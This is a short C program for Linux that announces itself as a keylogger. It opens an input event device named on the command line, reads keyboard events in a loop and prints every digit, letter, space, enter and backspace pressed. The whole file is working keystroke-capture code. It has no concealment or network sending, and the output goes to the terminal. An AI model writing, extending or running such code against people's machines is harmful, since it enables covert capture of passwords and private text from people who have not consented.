#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <event-file>\n", argv[0]);
        exit(-1);
    }
    
    printf("KeyLogger Active....\n");

    int fd = open(argv[1], O_RDONLY, 0);
    
    struct input_event ie;

    while(1) {
        read(fd, &ie, sizeof(ie));

        if (ie.type != EV_KEY)
            continue;
        if (ie.value != 1)
            continue;

        if (ie.code >= 2 && ie.code <= 10)
        {
            printf("%d", ie.code - 1);
        }
        else if (ie.code == 11)
        {
            printf("0");
        }
        else if (ie.code == KEY_Q) printf("q");
        else if (ie.code == KEY_W) printf("w");
        else if (ie.code == KEY_E) printf("e");
        else if (ie.code == KEY_R) printf("r");
        else if (ie.code == KEY_T) printf("t");
        else if (ie.code == KEY_Y) printf("y");
        else if (ie.code == KEY_U) printf("u");
        else if (ie.code == KEY_I) printf("i");
        else if (ie.code == KEY_O) printf("o");
        else if (ie.code == KEY_P) printf("p");

        else if (ie.code == KEY_A) printf("a");
        else if (ie.code == KEY_S) printf("s");
        else if (ie.code == KEY_D) printf("d");
        else if (ie.code == KEY_F) printf("f");
        else if (ie.code == KEY_G) printf("g");
        else if (ie.code == KEY_H) printf("h");
        else if (ie.code == KEY_J) printf("j");
        else if (ie.code == KEY_K) printf("k");
        else if (ie.code == KEY_L) printf("l");

        else if (ie.code == KEY_Z) printf("z");
        else if (ie.code == KEY_X) printf("x");
        else if (ie.code == KEY_C) printf("c");
        else if (ie.code == KEY_V) printf("v");
        else if (ie.code == KEY_B) printf("b");
        else if (ie.code == KEY_N) printf("n");
        else if (ie.code == KEY_M) printf("m");

        else if (ie.code == KEY_SPACE) printf(" ");
        else if (ie.code == KEY_ENTER) printf("\n");
        else if (ie.code == KEY_BACKSPACE) printf("\b \b");

        else{
            printf("Unknown Key Pressed: %d\n", ie.code);
        }
        
        fflush(stdout);
    }
}
